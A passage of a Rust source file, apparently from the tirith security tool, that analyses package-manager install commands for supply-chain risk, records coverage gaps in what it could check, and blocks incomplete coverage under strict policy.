//! Safe-install transaction analysis — the engine behind `tirith install`.
//!
//! Composes one explainable [`Verdict`] for a package-manager install from two
//! existing engines: the command-shape analysis ([`crate::engine::analyze`])
//! and the deterministic package-risk scorer ([`crate::package_risk`], with the
//! opt-in registry-API provenance signals). It re-implements neither, and
//! reuses [`crate::rules::threatintel::extract_packages`] for extraction.
//!
//! Honest framing: this is pre-execution analysis plus a recorded transaction —
//! NOT a sandbox. Runtime sandboxing is an explicit tirith non-goal
//! (`docs/threat-model.md`); the real install still runs with full privileges.
//!
//! The URL form of `tirith install` is handled separately by the CLI via
//! [`crate::runner`], not this module.

use crate::engine::{self, AnalysisContext};
use crate::extract::ScanContext;
use crate::package_risk::{
    self, ApiProvenance, ApiSignals, ContentSignals, NameVsPopular, PackageExistence,
    PackageSignals, RiskBreakdown,
};
use crate::policy::{FailMode, Policy};
use crate::registry_api::canonical_registry_name;
use crate::rules::threatintel::{self, PackageRef};
use crate::threatdb::{Ecosystem, ThreatDb};
use crate::tokenize::{Segment, ShellType};
use crate::verdict::{Action, Evidence, Finding, RuleId, Severity, Verdict};
use crate::version_intent::VersionIntent;

/// Which package manager an install transaction drives. (The `url` form of
/// `tirith install` is handled by the CLI via [`crate::runner`], not here.)
///
/// **M6 ch1** — the eight distro/docker/go backends are command-complete but
/// signal-weak: no registry adapter is wired, so `--online` provenance degrades
/// to [`crate::package_risk::ApiSignals::Unavailable`] (the CLI shows a banner),
/// and threat-DB lookups for these ecosystems return empty.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PackageManager {
    /// `npm install <pkg...>`
    Npm,
    /// `pip install <pkg...>`
    Pip,
    /// `cargo install <pkg...>`
    Cargo,
    /// `apt-get install <pkg...>` — Debian/Ubuntu. Maps to `apt-get` (the
    /// scriptable interface), not `apt`; one variant ↔ one program.
    Apt,
    /// `brew install <pkg...>` — Homebrew, macOS / Linuxbrew.
    Brew,
    /// `dnf install <pkg...>` — Fedora / RHEL 8+.
    Dnf,
    /// `yum install <pkg...>` — RHEL 7 and earlier, still common in CI images.
    Yum,
    /// `pacman -S <pkg...>` — Arch / Manjaro. argv[1] is `-S` (Sync), encoded
    /// via [`Self::install_subcommand`] so the generic argv builder is untouched.
    Pacman,
    /// `scoop install <pkg...>` — Windows-only installer. The dry-run analysis
    /// runs on every OS; the CLI gates the real run behind Windows.
    Scoop,
    /// `docker pull <image>[:<tag>|@<digest>]` — install subcommand is `pull`.
    /// Image refs are parsed by [`crate::parse::parse_docker_ref`].
    Docker,
    /// `go install <module>[@<version>]` — version defaults to `@latest`,
    /// mirroring `go install`. Module-path parsing is a local split on `@`.
    Go,
}

impl PackageManager {
    /// The program name to invoke (argv[0]). One variant ↔ one program; `Apt`
    /// maps to `apt-get` (the scriptable interface).
    pub fn program(self) -> &'static str {
        match self {
            PackageManager::Npm => "npm",
            PackageManager::Pip => "pip",
            PackageManager::Cargo => "cargo",
            PackageManager::Apt => "apt-get",
            PackageManager::Brew => "brew",
            PackageManager::Dnf => "dnf",
            PackageManager::Yum => "yum",
            PackageManager::Pacman => "pacman",
            PackageManager::Scoop => "scoop",
            PackageManager::Docker => "docker",
            PackageManager::Go => "go",
        }
    }

    /// The install subcommand. Most are `install`; Docker uses `pull`; Pacman
    /// uses `-S` (Sync) — encoding it here keeps [`build_argv`] generic.
    pub fn install_subcommand(self) -> &'static str {
        match self {
            PackageManager::Docker => "pull",
            PackageManager::Pacman => "-S",
            _ => "install",
        }
    }

    /// The registry [`Ecosystem`] this manager installs from (what the
    /// package-risk scorer is keyed on).
    pub fn ecosystem(self) -> Ecosystem {
        match self {
            PackageManager::Npm => Ecosystem::Npm,
            PackageManager::Pip => Ecosystem::PyPI,
            PackageManager::Cargo => Ecosystem::Crates,
            PackageManager::Apt => Ecosystem::Apt,
            PackageManager::Brew => Ecosystem::Brew,
            PackageManager::Dnf => Ecosystem::Dnf,
            PackageManager::Yum => Ecosystem::Yum,
            PackageManager::Pacman => Ecosystem::Pacman,
            PackageManager::Scoop => Ecosystem::Scoop,
            PackageManager::Docker => Ecosystem::Docker,
            PackageManager::Go => Ecosystem::Go,
        }
    }

    /// Human label for output — same as [`Self::program`] except `Apt` shows
    /// `"apt"` (the user-facing name) even though we invoke `apt-get`.
    pub fn label(self) -> &'static str {
        match self {
            PackageManager::Apt => "apt",
            other => other.program(),
        }
    }

    /// `true` when this manager has no registry adapter in [`crate::registry_api`],
    /// so `--online` provenance degrades to `Unavailable` and the CLI shows a
    /// banner. Must agree with `registry_api`'s `fetch` dispatch (source of truth).
    pub fn lacks_registry_adapter(self) -> bool {
        // Today only npm / pypi / crates.io have adapters.
        !matches!(
            self,
            PackageManager::Npm | PackageManager::Pip | PackageManager::Cargo
        )
    }

    /// The one-line banner printed (and embedded in JSON) when this manager has
    /// no registry adapter.
    pub fn no_registry_adapter_banner(self) -> String {
        format!(
            "note: registry-API provenance signals for {} are not available \
             (no registry adapter); analysis relies on threat-DB name match \
             and command-shape rules only",
            self.label()
        )
    }

    /// `true` when the real install runs only on Windows (currently Scoop); the
    /// dry-run/analysis path runs on every OS.
    pub fn is_windows_only_runtime(self) -> bool {
        matches!(self, PackageManager::Scoop)
    }
}

/// The argv of the real install command, e.g.
/// `["npm", "install", "left-pad", "--save-dev"]`. Executed directly via
/// `std::process::Command`, never through a shell. A reversible POSIX-quoted
/// rendering forms [`InstallPlan::analysis_command`] for the generic engine;
/// install extraction itself consumes these structured tokens directly.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InstallArgv {
    /// argv[0] — the package-manager program.
    pub program: String,
    /// argv[1..] — the install subcommand followed by the user's arguments.
    pub args: Vec<String>,
}

impl InstallArgv {
    /// The command as one reversible analysis/audit string; never handed to a
    /// shell. Every token is quoted independently so re-tokenizing cannot
    /// merge, split, or reinterpret an argv element. This retains raw token
    /// contents and is therefore **not terminal-safe**; human renderers must
    /// apply their strict display sanitizer after calling it.
    pub fn display(&self) -> String {
        std::iter::once(self.program.as_str())
            .chain(self.args.iter().map(String::as_str))
            .map(shell_quote_argv_token)
            .collect::<Vec<_>>()
            .join(" ")
    }
}

fn shell_quote_argv_token(token: &str) -> String {
    if !token.is_empty()
        && token.bytes().all(|byte| {
            byte.is_ascii_alphanumeric()
                || matches!(
                    byte,
                    b'_' | b'-' | b'.' | b'/' | b':' | b'@' | b'%' | b'+' | b',' | b'='
                )
        })
    {
        return token.to_string();
    }
    format!("'{}'", token.replace('\'', "'\\''"))
}

/// Typed completeness state for the install-specific interpretation of argv.
/// `Incomplete` is never inferred from `packages.is_empty()`; every executable
/// operand is classified independently, including mixed package + manifest
/// forms.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallCoverageState {
    Complete,
    Incomplete,
}

/// Why an install operand or provenance result could not be bound to what the
/// package manager will execute.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallCoverageGapKind {
    ManifestOrLocalSource,
    RemoteOrVcsSource,
    UnverifiedRegistry,
    UnrecognizedArgument,
    MissingArgumentValue,
    NoRegistryAdapter,
    UnresolvedVersion,
    ProvenanceUnavailable,
    ProvenanceMismatch,
    InstallScriptUnavailable,
    PackageListTruncated,
    GapLimitReached,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct InstallCoverageGap {
    pub kind: InstallCoverageGapKind,
    pub argument: String,
    pub reason: String,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct InstallCoverage {
    pub state: InstallCoverageState,
    pub gaps: Vec<InstallCoverageGap>,
}

impl Default for InstallCoverage {
    fn default() -> Self {
        Self {
            state: InstallCoverageState::Complete,
            gaps: Vec::new(),
        }
    }
}

impl InstallCoverage {
    const MAX_GAPS: usize = 64;

    fn push(&mut self, gap: InstallCoverageGap) {
        self.state = InstallCoverageState::Incomplete;
        if self.gaps.len() < Self::MAX_GAPS {
            if !self
                .gaps
                .iter()
                .any(|existing| existing.kind == gap.kind && existing.argument == gap.argument)
            {
                self.gaps.push(gap);
            }
        } else if !self
            .gaps
            .iter()
            .any(|existing| existing.kind == InstallCoverageGapKind::GapLimitReached)
        {
            self.gaps.push(InstallCoverageGap {
                kind: InstallCoverageGapKind::GapLimitReached,
                argument: "<additional arguments>".to_string(),
                reason: "more than 64 install coverage gaps were supplied; remaining operands were not silently treated as covered".to_string(),
            });
        }
    }
}

/// A fully-analyzed, ready-to-run install transaction, produced by
/// [`plan_install`]. The CLI inspects [`InstallPlan::verdict`], then runs
/// [`InstallPlan::argv`].
#[derive(Debug, Clone)]
pub struct InstallPlan {
    /// The package manager being driven.
    pub manager: PackageManager,
    /// The exact argv of the real install command.
    pub argv: InstallArgv,
    /// The argv joined into a raw string — analysis/audit/structured output
    /// only, never shell-executed or printed without terminal sanitization.
    pub analysis_command: String,
    /// The packages the transaction will install (empty for a flags-only /
    /// manifest install). Each carries its own [`RiskBreakdown`].
    pub packages: Vec<PlannedPackage>,
    /// The composed verdict: command-shape + package-risk findings, deduped,
    /// action from the strongest.
    pub verdict: Verdict,
    /// Coverage notes (missing threat DB, unrecognized spec) — honest limits.
    pub notes: Vec<String>,
    /// Typed proof that every executable install input and online provenance
    /// lookup was either bound or surfaced as an explicit gap.
    pub coverage: InstallCoverage,
}

impl InstallPlan {
    /// The per-package [`RiskBreakdown`]s, in [`InstallPlan::packages`] order —
    /// a derived view (stored once per [`PlannedPackage`], so no drift).
    pub fn risk_breakdowns(&self) -> impl Iterator<Item = &RiskBreakdown> {
        self.packages.iter().map(|p| &p.risk)
    }
}

/// One package the install transaction will install, plus its risk breakdown.
#[derive(Debug, Clone)]
pub struct PlannedPackage {
    /// The package as extracted from the install arguments.
    pub reference: PackageRef,
    /// Its deterministic [`package_risk`] breakdown.
    pub risk: RiskBreakdown,
}

/// How the registry-API (`--online`) package signals are resolved. The CLI
/// supplies this so the core never reaches the network itself.
pub enum OnlineMode<'a> {
    /// Offline: every package's API signals are [`ApiSignals::NotComputed`].
    Off,
    /// `--online`. Two seams, deliberately different in what they can return.
    ///
    /// C13 changed this variant from a single closure to a pair. The reason is
    /// that the old shape could not express a name-existence question at all:
    /// an unpinned spec returned before the closure was ever reached, so a
    /// plausible but nonexistent package name was accepted without any registry
    /// contact. Splitting the seam is what lets an unpinned install still be
    /// rejected for not existing.
    Resolver {
        /// Resolves an exact `(ecosystem, name, version)` tuple to full
        /// provenance. Unpinned/ranged inputs never reach this seam, which is
        /// what prevents latest-version provenance from being attached to
        /// different installed bytes.
        exact: &'a dyn Fn(Ecosystem, &str, &str) -> ApiSignals,
        /// Answers ONLY "does the registry claim this name exists". The return
        /// type is deliberately [`PackageExistence`] and not [`ApiSignals`]:
        /// an unpinned spec must not be able to acquire version-bound
        /// provenance through this seam by construction, not by convention.
        name_only: &'a dyn Fn(Ecosystem, &str) -> PackageExistence,
    },
    /// The real manager has ambient/project source configuration that Tirith
    /// cannot bind to its official-registry client. No registry lookup runs;
    /// this becomes an explicit blocking-grade coverage finding.
    UnverifiedSource(&'a str),
}

/// Inputs to [`plan_install`], in a struct so the signature stays stable.
pub struct PlanRequest<'a> {
    /// Which package manager is being driven.
    pub manager: PackageManager,
    /// The user's arguments after the source (the planner prepends the install
    /// subcommand), e.g. `["left-pad", "--save-dev"]`.
    pub user_args: &'a [String],
    /// The loaded threat DB, or `None` (analysis still runs, weaker signals).
    pub db: Option<&'a ThreatDb>,
    /// The active policy — severity overrides and the bypass decision.
    pub policy: &'a Policy,
    /// The current working directory, for the engine's command analysis.
    pub cwd: Option<String>,
    /// Whether the run is interactive (sets the verdict flag only; the gate is
    /// the CLI's job).
    pub interactive: bool,
    /// Registry-API resolution mode.
    pub online: OnlineMode<'a>,
}

/// Analyze a package-manager install and produce a ready-to-run [`InstallPlan`].
/// The single entry point: builds the argv, runs [`engine::analyze`], extracts
/// and scores packages with [`package_risk`], merges (de-duped) findings, and
/// derives the final [`Action`]. No network I/O except the caller's
/// [`OnlineMode::Resolver`]; never panics.
pub fn plan_install(request: &PlanRequest) -> InstallPlan {
    plan_install_inner(request, NpmProjectManifestCoverage::DiscoverFromDisk)
}

/// Analyze an install using npm project-manifest coverage derived from the
/// exact bytes already captured by the caller's source binding. The caller
/// must keep that capture bound until spawn; passing `None` means the bound
/// snapshot contained no applicable project manifest or executable inputs.
/// This avoids a second filesystem read and its malicious-clean-malicious ABA
/// window between analysis and pre-spawn identity verification.
pub fn plan_install_with_captured_npm_manifest(
    request: &PlanRequest,
    captured_gap: Option<&InstallCoverageGap>,
) -> InstallPlan {
    plan_install_inner(request, NpmProjectManifestCoverage::Captured(captured_gap))
}

enum NpmProjectManifestCoverage<'a> {
    DiscoverFromDisk,
    Captured(Option<&'a InstallCoverageGap>),
}

fn plan_install_inner(
    request: &PlanRequest,
    npm_manifest_coverage: NpmProjectManifestCoverage<'_>,
) -> InstallPlan {
    let manager = request.manager;
    let argv = build_argv(manager, request.user_args);
    let analysis_command = argv.display();

    let mut notes: Vec<String> = Vec::new();
    if request.db.is_none() {
        notes.push(
            "the local threat database is not installed — popular-package and \
             typosquat signals are unavailable, so package scoring is weaker. \
             Run `tirith threat-db update` to install it."
                .to_string(),
        );
    }

    // (1) command-shape analysis — analyze the synthesized command as `tirith
    // check` would (install-command + URL + threat-DB rules in one pass). We do
    // NOT call the rule modules directly; the engine already wires them.
    let ctx = AnalysisContext {
        input: analysis_command.clone(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: request.interactive,
        cwd: request.cwd.clone(),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
    };
    let command_verdict = engine::analyze(&ctx);
    let mut findings: Vec<Finding> = command_verdict.findings;

    // (2)+(3) package extraction and scoring. The install-specific path never
    // re-tokenizes `analysis_command`: a Segment is built directly from the
    // exact argv so spaces, empty values, quoting, and metacharacters retain
    // their original argument identity.
    let (extracted, packages_truncated): (Vec<PackageRef>, bool) = match manager {
        PackageManager::Docker | PackageManager::Go => (
            extract_packages_manager_specific(manager, request.user_args),
            false,
        ),
        _ => {
            let detail = extract_packages_from_argv(manager, &argv);
            (detail.packages, detail.truncated)
        }
    };
    let mut coverage = analyze_install_coverage(manager, request.user_args);
    // A package the extractor dropped is never planned, never scored and never
    // provenance-bound, so leaving coverage Complete would attach official
    // provenance to a partially-read command line.
    if packages_truncated {
        coverage.push(InstallCoverageGap {
            kind: InstallCoverageGapKind::PackageListTruncated,
            argument: "<package operands beyond the extraction cap>".to_string(),
            reason: format!(
                "more than {} distinct packages were named in one invocation; the remainder was \
                 not scored and must not be reported as covered",
                crate::npm_command::MAX_PACKAGES_PER_INVOCATION
            ),
        });
    }
    if manager == PackageManager::Npm {
        let manifest_gap = match npm_manifest_coverage {
            NpmProjectManifestCoverage::DiscoverFromDisk => {
                npm_project_manifest_coverage_gap(request.cwd.as_deref(), request.user_args)
            }
            NpmProjectManifestCoverage::Captured(gap) => gap.cloned(),
        };
        if let Some(gap) = manifest_gap {
            coverage.push(gap);
        }
    }
    // Official provenance is attached only when the entire manager-specific
    // input grammar is understood. An unknown option may itself alter source,
    // cache, transport, or executable inputs; treating only known registry
    // gaps as disqualifying would recreate the partial-coverage bypass.
    let registry_source_verified = coverage.state == InstallCoverageState::Complete;

    // M6 ch1 — the `schemeless_to_sink` FP on `go install` / `docker pull` is
    // suppressed at the engine layer in `extract.rs`; nothing extra needed here.

    // Keep only packages for this manager's ecosystem (belt-and-suspenders).
    let eco = manager.ecosystem();
    let mut planned: Vec<PlannedPackage> = Vec::new();

    let online_in_use = !matches!(request.online, OnlineMode::Off);
    for pkg in extracted.into_iter().filter(|p| p.ecosystem == eco) {
        let (signals, signal_gap) =
            gather_package_signals(request, eco, &pkg, registry_source_verified, &mut notes);
        if let Some(gap) = signal_gap {
            coverage.push(gap);
        }
        let breakdown = package_risk::score_package(&signals);

        // M6 ch7 — the install-script signal needs `--online` (or on-disk script
        // text). A bare offline install can't evaluate it; surface the gap
        // rather than silently no-op the policy rule.
        if request
            .policy
            .package_policy
            .block_install_scripts_for_unknown_packages
            && matches!(signals.name_vs_popular, NameVsPopular::Unknown)
        {
            let script_analysis_available = matches!(
                &signals.api,
                ApiSignals::Available { provenance }
                    if provenance.install_script_signals.is_some()
            );
            if !script_analysis_available {
                let reason = if online_in_use {
                    "the exact selected artifact did not provide install-script evidence"
                } else {
                    "install-script analysis is unavailable offline"
                };
                notes.push(format!(
                    "(install-script policy was not silently treated as evaluated for '{}': {reason})",
                    pkg.name
                ));
                coverage.push(InstallCoverageGap {
                    kind: InstallCoverageGapKind::InstallScriptUnavailable,
                    argument: pkg.name.clone(),
                    reason: reason.to_string(),
                });
            }
        }

        // Likewise: offline runs can't resolve `PackageExistence`, so
        // `block_not_found` never fires — note the gap.
        if request.policy.package_policy.block_not_found
            && !online_in_use
            && package_existence(&signals.api).is_none()
        {
            notes.push(format!(
                "(package-existence signal requires --online — `block_not_found` policy did \
                 not evaluate for '{}')",
                pkg.name
            ));
        }

        // (4) breakdown → findings, de-duped against the engine's threat-DB
        // findings for this package.
        for finding in risk_findings_for(&pkg, &breakdown, &findings, request.policy) {
            findings.push(finding);
        }

        planned.push(PlannedPackage {
            reference: pkg,
            risk: breakdown,
        });
    }

    if planned.is_empty() {
        // M6 ch1 — a no-adapter backend (apt/brew/dnf/yum/pacman/scoop) doesn't
        // score per-package even with a name given; "no installable package
        // name" would mislead for `apt-get install nginx`. Use a backend-honest
        // note for those; keep the manifest-form pointer for npm/pip/cargo.
        let note = if manager.lacks_registry_adapter() && !request.user_args.is_empty() {
            format!(
                "{} has no registry adapter wired into tirith yet, so per-package \
                 risk scoring did NOT run (threat-DB name match + command-shape \
                 rules only). The banner above carries the same signal.",
                manager.label(),
            )
        } else {
            format!(
                "no installable package name found on the command line for {} — \
                 scoring covered the command shape only. A manifest-driven install \
                 (e.g. a lockfile or requirements file) has no package argument to \
                 score; run `tirith ecosystem scan` to assess a project's manifests.",
                manager.label(),
            )
        };
        notes.push(note);

        // PR #121 fix-list item 1 — close the manifest-form install bypass: a
        // manifest-driven form (`pip install -r …`, bare `npm install`, …) used
        // to exit ALLOW with zero package scoring (`extract_packages` can't read
        // a manifest body). When a manifest flag is present, emit a finding
        // pointing at `tirith ecosystem scan`; severity escalates under
        // `fail_mode: closed` so strict mode hard-blocks.
        if let Some(manifest_arg) = detect_manifest_flag(request.user_args) {
            let strict = matches!(request.policy.fail_mode, FailMode::Closed);
            let severity = if strict {
                Severity::High
            } else {
                Severity::Medium
            };
            let mode_note = if strict {
                "Under `fail_mode: closed` the manifest path must be analyzed before \
                 the install is allowed to proceed."
            } else {
                "Re-run `tirith ecosystem scan` against the manifest to score every \
                 declared dependency before proceeding."
            };
            let manifest_label = match &manifest_arg {
                ManifestFlag::PathArg { flag, value } => format!("{flag} {value}"),
                ManifestFlag::JoinedPath { token } => token.clone(),
                ManifestFlag::Bareword { token } => token.clone(),
                ManifestFlag::NoArgs => "(no package argument)".to_string(),
            };
            let scan_target: &str = match &manifest_arg {
                ManifestFlag::PathArg { value, .. } => value,
                ManifestFlag::JoinedPath { token } => {
                    token.split_once('=').map(|(_k, v)| v).unwrap_or(".")
                }
                ManifestFlag::Bareword { token } => token,
                ManifestFlag::NoArgs => ".",
            };
            findings.push(Finding {
                rule_id: RuleId::ThreatSuspiciousPackage,
                severity,
                title: format!(
                    "{} manifest install — package names could not be extracted \
                     from {}",
                    manager.label(),
                    manifest_label,
                ),
                description: format!(
                    "`{}` is a manifest-driven install ({}): package names could \
                     not be extracted from the manifest {}, so per-package risk \
                     scoring did NOT run. Without scoring, a malicious or \
                     typosquatted dependency declared in the manifest would not \
                     surface in this verdict. {} Run `tirith ecosystem scan {}`.",
                    analysis_command,
                    manifest_arg.describe(),
                    manifest_label,
                    mode_note,
                    scan_target,
                ),
                evidence: vec![Evidence::Text {
                    detail: format!(
                        "manager={} manifest_form={} manifest_arg={} \
                         fail_mode={}",
                        manager.label(),
                        manifest_arg.describe(),
                        manifest_label,
                        if strict { "closed" } else { "open" },
                    ),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    // Every typed gap becomes an explicit decision input. Preserve the legacy
    // manifest finding above for zero-package forms, but cover mixed forms such
    // as `pip install benign -r attacker.txt` here as well.
    let legacy_manifest_finding_present = planned.is_empty()
        && findings
            .iter()
            .any(|finding| finding.title.contains("manifest install"));
    for gap in &coverage.gaps {
        if legacy_manifest_finding_present
            && gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
        {
            continue;
        }
        if gap.kind == InstallCoverageGapKind::NoRegistryAdapter
            && !matches!(request.policy.fail_mode, FailMode::Closed)
        {
            continue;
        }
        findings.push(coverage_gap_finding(
            manager,
            gap,
            &analysis_command,
            request.policy,
        ));
    }

    // (5) compose the verdict — apply policy severity overrides, then derive
    // the action from the strongest finding (the shared max-severity mapping).
    for finding in &mut findings {
        if let Some(sev) = request.policy.severity_override(&finding.rule_id) {
            finding.severity = sev;
        }
    }
    if coverage.state == InstallCoverageState::Incomplete
        && matches!(request.policy.fail_mode, FailMode::Closed)
    {
        // Strict coverage is an invariant, not a user-tunable rule severity.
        // Append this floor after generic severity overrides so a broad
        // ThreatSuspiciousPackage downgrade cannot turn unscored executable
        // input into an allow/warn transaction.
        findings.push(Finding {
            rule_id: RuleId::ThreatSuspiciousPackage,
            severity: Severity::High,
            title: format!(
                "{} install is blocked because executable-input coverage is incomplete",
                manager.label()
            ),
            description: format!(
                "Strict fail-closed policy requires every executable install input and its provenance to be covered. This transaction has {} explicit coverage gap(s), so severity overrides cannot lower it below Block.",
                coverage.gaps.len()
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "manager={} coverage_state=incomplete gap_count={} fail_mode=closed",
                    manager.label(),
                    coverage.gaps.len()
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }
    let mut verdict = Verdict::from_findings(
        findings,
        command_verdict.tier_reached,
        command_verdict.timings_ms,
    );
    verdict.interactive_detected = request.interactive;
    verdict.urls_extracted_count = command_verdict.urls_extracted_count;

    InstallPlan {
        manager,
        argv,
        analysis_command,
        packages: planned,
        verdict,
        notes,
        coverage,
    }
}

/// The kind of manifest-driven install flag detected on a `planned.is_empty()`
/// command — enough structure for the finding to name the exact form.
#[derive(Debug, Clone, PartialEq, Eq)]
enum ManifestFlag {
    /// Flag with a separate-token path (`-r requirements.txt`, `--path .`, …).
    PathArg { flag: String, value: String },
    /// Joined `flag=value` form (`--requirement=requirements.txt`, `--path=.`).
    JoinedPath { token: String },
    /// A bareword that is itself a manifest reference (`.`, `./subdir`, `/abs`).
    Bareword { token: String },
    /// `npm install` with NO args (implicit local `package(-lock).json`).
    NoArgs,
}

impl ManifestFlag {
    /// One-line description for finding bodies.
    fn describe(&self) -> &'static str {
        match self {
            ManifestFlag::PathArg { .. } | ManifestFlag::JoinedPath { .. } => {
                "explicit manifest flag"
            }
            ManifestFlag::Bareword { .. } => "manifest path positional",
            ManifestFlag::NoArgs => "implicit local manifest (no args)",
        }
    }
}

/// Detect whether `user_args` is a manifest-driven install. Conservative: only
/// the well-known pip/npm/cargo forms (`-r`/`--requirement`/`-c`/`--constraint`/
/// `-e`/`--editable`, `--path`/`--git`, joined `flag=value`, bareword paths, and
/// a bare `npm install`); anything else returns `None`. Runs before the verdict;
/// `user_args` is what the install subcommand will see.
fn detect_manifest_flag(user_args: &[String]) -> Option<ManifestFlag> {
    // Empty args = npm's implicit local manifest. (The CLI rejects empty args
    // for pip/cargo before this is called, so NoArgs surfaces for npm.)
    if user_args.is_empty() {
        return Some(ManifestFlag::NoArgs);
    }

    // Separate-token flags (`-r FILE` / `--path PATH` / etc.).
    const SEPARATE_FLAGS: &[&str] = &[
        // pip
        "-r",
        "--requirement",
        "--requirements",
        "-c",
        "--constraint",
        "-e",
        "--editable",
        // cargo
        "--path",
        "--git",
    ];
    let mut i = 0;
    while i < user_args.len() {
        let arg = user_args[i].as_str();
        if SEPARATE_FLAGS.contains(&arg) {
            // Surface the finding even if the value token is missing (a usage
            // error pip itself catches).
            let value = user_args.get(i + 1).cloned().unwrap_or_default();
            return Some(ManifestFlag::PathArg {
                flag: arg.to_string(),
                value,
            });
        }
        // Joined `flag=value` forms.
        if let Some((flag_part, _value_part)) = arg.split_once('=') {
            const JOINED_FLAGS: &[&str] = &[
                // pip
                "--requirement",
                "--requirements",
                "--constraint",
                "--editable",
                // cargo
                "--path",
                "--git",
            ];
            if JOINED_FLAGS.contains(&flag_part) {
                return Some(ManifestFlag::JoinedPath {
                    token: arg.to_string(),
                });
            }
        }
        // Bareword path positional (pip's `pip install .`): a manifest ref only
        // when it LOOKS like a path (starts with `.`, `/`, or `~`). A plain name
        // like `requests` is not; a bare `.txt` suffix is not a signal either.
        if !arg.starts_with('-')
            && (arg == "."
                || arg == ".."
                || arg.starts_with("./")
                || arg.starts_with("../")
                || arg.starts_with('/')
                || arg.starts_with('~'))
        {
            return Some(ManifestFlag::Bareword {
                token: arg.to_string(),
            });
        }
        i += 1;
    }
    None
}

/// Build the real install argv: install subcommand after argv[0], then the
/// user's arguments verbatim (never interpreted or rewritten).
pub fn build_argv(manager: PackageManager, user_args: &[String]) -> InstallArgv {
    let mut args = Vec::with_capacity(user_args.len() + 1);
    args.push(manager.install_subcommand().to_string());
    args.extend(user_args.iter().cloned());
    InstallArgv {
        program: manager.program().to_string(),
        args,
    }
}

/// Run the shared package extractor on an exact argv-backed segment. The
/// extractor sees the same token vector that the CLI runner receives;
/// `analysis_command` is deliberately not involved.
fn extract_packages_from_argv(
    manager: PackageManager,
    argv: &InstallArgv,
) -> threatintel::ExtractedPackages {
    let raw = argv.display();
    let segment = Segment {
        byte_range: 0..raw.len(),
        raw,
        command: Some(manager.program().to_string()),
        args: argv.args.clone(),
        preceding_separator: None,
    };
    threatintel::extract_packages_detail(std::slice::from_ref(&segment))
}

fn analyze_install_coverage(manager: PackageManager, user_args: &[String]) -> InstallCoverage {
    let mut coverage = InstallCoverage::default();
    if manager.lacks_registry_adapter() {
        coverage.push(InstallCoverageGap {
            kind: InstallCoverageGapKind::NoRegistryAdapter,
            argument: manager.label().to_string(),
            reason: format!(
                "{} has no registry adapter, so its executable package operands cannot be provenance-bound",
                manager.label()
            ),
        });
    }
    match manager {
        PackageManager::Npm => analyze_npm_coverage(user_args, &mut coverage),
        PackageManager::Pip => analyze_pip_coverage(user_args, &mut coverage),
        PackageManager::Cargo => analyze_cargo_coverage(user_args, &mut coverage),
        PackageManager::Apt
        | PackageManager::Brew
        | PackageManager::Dnf
        | PackageManager::Yum
        | PackageManager::Pacman
        | PackageManager::Scoop
        | PackageManager::Docker
        | PackageManager::Go => {}
    }
    coverage
}

fn missing_value_gap(coverage: &mut InstallCoverage, flag: &str) {
    coverage.push(InstallCoverageGap {
        kind: InstallCoverageGapKind::MissingArgumentValue,
        argument: flag.to_string(),
        reason: format!("{flag} requires a following value, so the install grammar is incomplete"),
    });
}

fn manifest_gap(coverage: &mut InstallCoverage, argument: &str, reason: &str) {
    coverage.push(InstallCoverageGap {
        kind: InstallCoverageGapKind::ManifestOrLocalSource,
        argument: argument.to_string(),
        reason: reason.to_string(),
    });
}

fn remote_source_gap(coverage: &mut InstallCoverage, argument: &str, reason: &str) {
    coverage.push(InstallCoverageGap {
        kind: InstallCoverageGapKind::RemoteOrVcsSource,
        argument: argument.to_string(),
        reason: reason.to_string(),
    });
}

fn registry_gap(coverage: &mut InstallCoverage, argument: &str, reason: &str) {
    coverage.push(InstallCoverageGap {
        kind: InstallCoverageGapKind::UnverifiedRegistry,
        argument: argument.to_string(),
        reason: reason.to_string(),
    });
}

fn unknown_flag_gap(coverage: &mut InstallCoverage, argument: &str, manager: PackageManager) {
    coverage.push(InstallCoverageGap {
        kind: InstallCoverageGapKind::UnrecognizedArgument,
        argument: argument.to_string(),
        reason: format!(
            "tirith does not classify this {} install option and cannot prove that it introduces no executable input",
            manager.label()
        ),
    });
}

const MAX_NPM_PROJECT_MANIFEST_BYTES: u64 = 1024 * 1024;

/// npm can merge the current project's dependencies and lifecycle scripts into
/// an install even when the user also supplied an explicit package operand.
/// Surface that implicit executable input before official provenance is used.
fn npm_project_manifest_coverage_gap(
    cwd: Option<&str>,
    args: &[String],
) -> Option<InstallCoverageGap> {
    if npm_install_uses_global_location(args) {
        return None;
    }
    let cwd = std::path::Path::new(cwd?);
    for ancestor in cwd.ancestors() {
        let manifest = ancestor.join("package.json");
        let bytes = match crate::util::read_text_no_follow_capped(
            &manifest,
            MAX_NPM_PROJECT_MANIFEST_BYTES,
        ) {
            Ok(bytes) => bytes,
            Err(crate::util::OpenRegularError::NotFound) => continue,
            Err(
                crate::util::OpenRegularError::NotRegularFile
                | crate::util::OpenRegularError::TooLarge,
            ) => {
                return Some(InstallCoverageGap {
                    kind: InstallCoverageGapKind::ManifestOrLocalSource,
                    argument: manifest.display().to_string(),
                    reason: format!(
                        "npm project manifest is not a regular file bounded to {MAX_NPM_PROJECT_MANIFEST_BYTES} bytes"
                    ),
                });
            }
            Err(crate::util::OpenRegularError::Io(error)) => {
                return Some(InstallCoverageGap {
                    kind: InstallCoverageGapKind::ManifestOrLocalSource,
                    argument: manifest.display().to_string(),
                    reason: format!(
                        "npm project manifest could not be read before install: {error}"
                    ),
                });
            }
        };
        let content = match String::from_utf8(bytes) {
            Ok(content) => content,
            Err(error) => {
                return Some(InstallCoverageGap {
